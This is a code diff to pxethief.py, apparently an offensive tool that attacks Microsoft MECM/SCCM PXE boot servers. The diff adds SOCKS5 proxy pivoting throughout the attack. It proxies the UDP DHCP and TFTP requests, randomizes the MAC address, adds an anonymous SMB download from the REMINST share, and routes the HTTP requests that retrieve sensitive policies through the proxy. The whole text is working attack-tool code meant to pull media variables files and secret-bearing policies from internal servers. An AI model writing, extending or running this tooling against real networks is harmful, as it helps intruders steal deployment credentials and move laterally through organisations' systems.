@@ -68,6 +68,17 @@ from rich.table import Table
 from rich.panel import Panel
 from rich.text import Text
 from rich import box
+import urllib.parse
+
+try:
+    import socks as pysocks
+except ImportError:
+    pysocks = None
+
+try:
+    from impacket.smbconnection import SMBConnection as ImpacketSMB
+except ImportError:
+    ImpacketSMB = None
 
 console = Console(highlight=False)
 
@@ -158,6 +169,9 @@ DUMP_TS_Sequence_XML = False
 
 # Global Variables
 BLANK_PASSWORDS_FOUND = False
+
+# SOCKS5 Proxy — set via --proxy flag, tuple of (host, port, username, password) or None
+SOCKS5_PROXY = None
 
 def safe_decode_utf16le(data, label="data"):
     try:
@@ -261,8 +275,11 @@ def tftp_download(server_ip, remote_path, local_path, timeout=10, blksize=512):
     OPCODE_ERROR = 5
     OPCODE_OACK = 6
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(timeout)
+    if SOCKS5_PROXY:
+        sock = create_socks5_udp_socket(timeout)
+    else:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(timeout)
 
     request = pystruct.pack("!H", OPCODE_RRQ) + remote_path.encode("ascii") + b"\x00" + b"octet" + b"\x00"
     if blksize != 512:
@@ -329,9 +346,68 @@ def validate_ip_or_resolve_hostname(input):
         try:
             ip_address = socket.gethostbyname(input.strip())
         except socket.gaierror:
+            if SOCKS5_PROXY:
+                warning(f"Cannot resolve [bold]{input}[/] locally — passing hostname to SOCKS5 proxy for resolution")
+                return input.strip()
             error(f"{input} does not appear to be a valid hostname or IP address (or DNS does not resolve)")
             sys.exit(0)
     return ip_address
+
+def create_socks5_udp_socket(timeout=10):
+    """Create a PySocks UDP socket configured for SOCKS5 UDP ASSOCIATE."""
+    sock = pysocks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.set_proxy(pysocks.SOCKS5, SOCKS5_PROXY[0], SOCKS5_PROXY[1],
+                   username=SOCKS5_PROXY[2], password=SOCKS5_PROXY[3])
+    sock.settimeout(timeout)
+    return sock
+
+def configure_proxy_networking():
+    """Set up networking for SOCKS5 proxy mode — no local interface needed."""
+    global clientIPAddress, clientMacAddress
+    clientIPAddress = "0.0.0.0"
+    mac_bytes = os.urandom(6)
+    mac_bytes = bytes([(mac_bytes[0] | 0x02) & 0xFE]) + mac_bytes[1:]
+    clientMacAddress = mac_bytes
+    mac_str = ':'.join(f'{b:02x}' for b in clientMacAddress)
+    success(f"SOCKS5 proxy mode — random MAC [bold]{mac_str}[/]")
+
+def smb_download(server, remote_path, local_path):
+    """Download a file via SMB from REMINST share, through SOCKS5 proxy."""
+    if ImpacketSMB is None:
+        error("impacket is required for SMB fallback — [bold]pip install impacket[/]")
+        return False
+
+    share = 'REMINST'
+    smb_path = remote_path.replace('/', '\\')
+    if not smb_path.startswith('\\'):
+        smb_path = '\\' + smb_path
+
+    original_socket = socket.socket
+    if SOCKS5_PROXY:
+        pysocks.set_default_proxy(pysocks.SOCKS5, SOCKS5_PROXY[0], SOCKS5_PROXY[1],
+                                  username=SOCKS5_PROXY[2], password=SOCKS5_PROXY[3])
+        socket.socket = pysocks.socksocket
+
+    try:
+        conn = ImpacketSMB(server, server, sess_port=445, timeout=30)
+        conn.login('', '')
+        info(f"Connected to [bold]\\\\{server}\\{share}[/] (anonymous)")
+
+        file_data = bytearray()
+        def recv_cb(data):
+            file_data.extend(data)
+
+        conn.getFile(share, smb_path, recv_cb)
+        conn.close()
+
+        with open(local_path, 'wb') as f:
+            f.write(file_data)
+        return len(file_data)
+    except Exception as e:
+        error(f"SMB download failed: {e}")
+        return False
+    finally:
+        socket.socket = original_socket
 
 def print_interface_table():
     warning("Set the interface to be used by scapy in [bold]manual_interface_selection_by_id[/] in settings.ini")
@@ -344,6 +420,10 @@ def get_config_section(section_name):
     return config[section_name]
 
 def configure_scapy_networking(ip_address):
+    if SOCKS5_PROXY:
+        configure_proxy_networking()
+        return
+
     if ip_address is not None:
         ip_address = validate_ip_or_resolve_hostname(ip_address)
         route_info = conf.route.route(ip_address, verbose=0)
@@ -445,44 +525,60 @@ def find_pxe_server():
 def get_variable_file_path(tftp_server):
     info("Asking ConfigMgr for media variables and BCD file locations...")
 
-    pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
-    ("message-type","request"),
-    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
-    ('pxe_client_architecture', b'\x00\x00'),
-    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),
-    ('vendor_class_id', b'PXEClient'),
-    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'),
-    "end"])
+    dhcp_options_list = [
+        ("message-type","request"),
+        ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
+        ('pxe_client_architecture', b'\x00\x00'),
+        (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),
+        ('vendor_class_id', b'PXEClient'),
+        ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'),
+        "end"
+    ]
 
-    ans = sr1(pkt, timeout=10, iface=conf.iface, filter="udp port 4011 or udp port 68")
+    if SOCKS5_PROXY:
+        # Send via SOCKS5 UDP — build BOOTP/DHCP payload with Scapy, send through PySocks
+        bootp_pkt = BOOTP(ciaddr=clientIPAddress, chaddr=clientMacAddress) / DHCP(options=dhcp_options_list)
+        sock = create_socks5_udp_socket(timeout=10)
+        try:
+            sock.sendto(bytes(bootp_pkt), (tftp_server, 4011))
+            response_data, _ = sock.recvfrom(65536)
+        except socket.timeout:
+            error(f"No DHCP response from {tftp_server}:4011 via SOCKS5 proxy")
+            info("Ensure the SOCKS5 server supports UDP ASSOCIATE and can reach the target")
+            sys.exit(-1)
+        finally:
+            sock.close()
+        packet = BOOTP(response_data)
+    else:
+        # Send via raw Scapy packet
+        pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=dhcp_options_list)
+        packet = sr1(pkt, timeout=10, iface=conf.iface, filter="udp port 4011 or udp port 68")
+        if not packet:
+            error(f"No DHCP response from MECM server {tftp_server} — check IP address and firewall rules")
+            sys.exit(-1)
 
     encrypted_key = None
-    if ans:
-        packet = ans
-        dhcp_options = packet[1][DHCP].options
+    dhcp_options = packet[DHCP].options
 
-        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
-        if variables_file:
-            packet_type = variables_file[0]
-            data_length = variables_file[1]
+    option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
+    if variables_file:
+        packet_type = variables_file[0]
+        data_length = variables_file[1]
 
-            if packet_type == 1:
-                variables_file = variables_file[2:2+data_length]
-                variables_file = variables_file.decode('utf-8')
-            elif packet_type == 2:
-                encrypted_key = variables_file[2:2+data_length]
+        if packet_type == 1:
+            variables_file = variables_file[2:2+data_length]
+            variables_file = variables_file.decode('utf-8')
+        elif packet_type == 2:
+            encrypted_key = variables_file[2:2+data_length]
 
-                string_length_index = 2 + data_length + 1
-                beginning_of_string_index = 2 + data_length + 2
-                string_length = variables_file[string_length_index]
-                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
-                variables_file = variables_file.decode('utf-8')
-            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")
-        else:
-            error("No variable file location (DHCP option 243) found in server response")
-            sys.exit(-1)
+            string_length_index = 2 + data_length + 1
+            beginning_of_string_index = 2 + data_length + 2
+            string_length = variables_file[string_length_index]
+            variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
+            variables_file = variables_file.decode('utf-8')
+        bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")
     else:
-        error(f"No DHCP response from MECM server {tftp_server} — check IP address and firewall rules")
+        error("No variable file location (DHCP option 243) found in server response")
         sys.exit(-1)
 
     found(f"Variables file: [bold]{variables_file}[/]")
@@ -556,8 +652,19 @@ def get_pxe_files(ip):
         size = tftp_download(tftp_server_ip, variables_file, var_file_name)
         success(f"Downloaded [bold]{var_file_name}[/] ({size} bytes)")
     except Exception as e:
-        error(f"Failed to download media variables file via TFTP: {e}")
-        sys.exit(-1)
+        if SOCKS5_PROXY:
+            warning(f"TFTP over SOCKS5 failed: {e}")
+            info("Attempting SMB fallback via REMINST share...")
+            smb_result = smb_download(tftp_server_ip, variables_file, var_file_name)
+            if smb_result:
+                success(f"Downloaded [bold]{var_file_name}[/] via SMB ({smb_result} bytes)")
+            else:
+                error("Both TFTP and SMB download failed")
+                info("Download the file manually and use mode 3: [bold]pxethief.py 3 <file> [password][/]")
+                sys.exit(-1)
+        else:
+            error(f"Failed to download media variables file via TFTP: {e}")
+            sys.exit(-1)
 
     info(f"Downloading [bold]{bcd_file_name}[/] via TFTP...")
     try:
@@ -1010,7 +1117,13 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
     if USING_TLS:
         session.verify = False
         session.cert = (CERT_FILE, KEY_FILE)
-    if USING_PROXY:
+    if SOCKS5_PROXY:
+        proxy_auth = ""
+        if SOCKS5_PROXY[2]:
+            proxy_auth = f"{SOCKS5_PROXY[2]}:{SOCKS5_PROXY[3]}@"
+        socks5_url = f"socks5h://{proxy_auth}{SOCKS5_PROXY[0]}:{SOCKS5_PROXY[1]}"
+        session.proxies = {"http": socks5_url, "https": socks5_url}
+    elif USING_PROXY:
         proxies = {"https": '127.0.0.1:8080'}
         session.proxies = proxies
 
@@ -1136,8 +1249,31 @@ def print_usage():
     table.add_row("8", "Write default settings.ini")
     table.add_row("10", "Print Scapy interface table")
     console.print(table)
+    console.print()
+    console.print("[bold cyan]Options:[/]")
+    console.print("  [bold yellow]--proxy socks5://[user:pass@]host:port[/]   Route all traffic through a SOCKS5 proxy")
 
 if __name__ == "__main__":
+
+    # Extract --proxy flag before mode parsing
+    if '--proxy' in sys.argv:
+        idx = sys.argv.index('--proxy')
+        if idx + 1 >= len(sys.argv):
+            print("[-] --proxy requires a URL argument (e.g. socks5://host:port)")
+            sys.exit(1)
+        proxy_url = sys.argv[idx + 1]
+        del sys.argv[idx:idx + 2]
+
+        parsed = urllib.parse.urlparse(proxy_url)
+        if parsed.scheme != 'socks5':
+            print("[-] Only socks5:// proxy URLs are supported")
+            sys.exit(1)
+        if pysocks is None:
+            print("[-] PySocks is required for --proxy support")
+            print("[!] Install with: pip install pysocks")
+            sys.exit(1)
+
+        SOCKS5_PROXY = (parsed.hostname, parsed.port or 1080, parsed.username, parsed.password)
 
     if len(sys.argv) < 2 or sys.argv[1] == "-h":
         print_usage()
@@ -1148,6 +1284,10 @@ if __name__ == "__main__":
 
     elif int(sys.argv[1]) == 1:
         console.print(BANNER)
+        if SOCKS5_PROXY:
+            error("Mode 1 (DHCP broadcast) cannot work over a SOCKS5 proxy")
+            info("Use mode 2 with the DP IP: [bold]pxethief.py 2 <DP-IP> --proxy socks5://host:port[/]")
+            sys.exit(1)
         info("Finding and downloading encrypted media variables file...")
         configure_scapy_networking(None)
         get_pxe_files(None)
@@ -1155,9 +1295,12 @@ if __name__ == "__main__":
     elif int(sys.argv[1]) == 2:
         console.print(BANNER)
         if len(sys.argv) != 3:
-            error("Usage: pxethief.py 2 <ip address of MECM server>")
+            error("Usage: pxethief.py 2 <ip address of MECM server> [--proxy socks5://host:port]")
             sys.exit(0)
-        info(f"Targeting MECM server at [bold]{sys.argv[2]}[/]")
+        if SOCKS5_PROXY:
+            info(f"Targeting MECM server [bold]{sys.argv[2]}[/] via SOCKS5 proxy [bold]{SOCKS5_PROXY[0]}:{SOCKS5_PROXY[1]}[/]")
+        else:
+            info(f"Targeting MECM server at [bold]{sys.argv[2]}[/]")
         configure_scapy_networking(sys.argv[2])
         get_pxe_files(sys.argv[2])
 
